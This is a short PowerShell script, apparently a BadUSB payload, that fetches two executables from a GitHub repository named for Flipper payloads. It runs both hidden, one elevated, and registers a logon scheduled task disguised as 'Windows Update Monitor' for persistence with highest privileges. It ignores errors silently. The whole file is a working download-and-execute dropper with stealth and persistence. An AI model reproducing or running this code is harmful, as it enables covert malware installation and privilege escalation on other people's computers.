# Main EXE for persistence
$mainExeUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/EXE/WinUman.exe"
$mainExePath = "$env:APPDATA\WinUman.exe"
$taskName = "Windows Update Monitor"

try {
    # Download EXE if it doesn't exist
    if (-not (Test-Path $mainExePath)) {
        Invoke-WebRequest -Uri $mainExeUrl -OutFile $mainExePath -UseBasicParsing
    }

    # Start the EXE hidden
    Start-Process -FilePath $mainExePath -WindowStyle Hidden

    # Register scheduled task (persistence)
    if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
        $action = New-ScheduledTaskAction -Execute $mainExePath
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest
    }
} catch {
    # Optional: Log or silently ignore
}

# Secondary EXE - one-time payload
$telemetryUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/EXE/WinTelemetry.exe"
$telemetryPath = "$env:TEMP\WinTelemetry.exe"

try {
    Invoke-WebRequest -Uri $telemetryUrl -OutFile $telemetryPath -UseBasicParsing
    Start-Process -FilePath $telemetryPath -Verb RunAs -WindowStyle Hidden
    Start-Sleep -Seconds 5
    # Optionally delete after running
    # Remove-Item -Path $telemetryPath -Force
} catch {
    # Optional: Log or silently ignore
}
